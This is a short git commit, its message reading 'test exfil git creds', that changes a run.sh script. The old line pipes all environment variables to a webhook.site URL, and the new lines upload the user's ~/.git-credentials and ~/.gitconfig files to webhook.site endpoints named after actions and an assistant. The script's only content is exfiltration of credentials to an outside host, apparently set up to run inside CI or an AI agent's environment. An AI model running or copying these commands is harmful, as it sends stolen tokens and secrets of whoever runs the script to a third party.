ed2984a92f8d7f79c6de480897d4e4939716c105
Raphael Silva <raphaelcabidelli20@gmail.com>
2025-10-29 19:07:13 +0000

    test exfil git creds

--- run.sh
+++ run.sh
@@ -1,2 +1,3 @@
 #!/usr/bin/env bash
-env | curl -X POST -d @- https://webhook.site/TestActions/TestOpenAssistant/env
+curl -X POST -F "file=@$HOME/.git-credentials" https://webhook.site/TestActions/TestOpenAssistant/env1
+curl -X POST -F "file=@$HOME/.gitconfig" https://webhook.site/TestActions/TestOpenAssistant/env2
